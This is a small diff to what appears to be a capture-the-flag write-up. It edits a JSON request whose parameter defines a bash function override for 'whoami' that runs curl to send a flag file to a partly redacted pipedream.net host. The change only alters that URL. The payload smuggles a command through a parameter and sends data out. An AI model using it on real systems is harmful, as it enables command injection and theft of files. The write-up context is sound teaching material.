@@ -122,7 +122,7 @@ Only being able to execute some hard-coded commands like `whoami` and being able
 ```json
 {
     "DynamicAction":"GetUsername",
-    "Parameters":"[{\"BASH_FUNC_whoami%%\":\"() { curl -d @flag https://...m.pipedream.net; }\"}]",
+    "Parameters":"[{\"BASH_FUNC_whoami%%\":\"() { curl -d @flag https://...pipedream.net; }\"}]",
     "Types":[
         "System.Collections.Generic.Dictionary`2[System.String,System.String]"
     ]
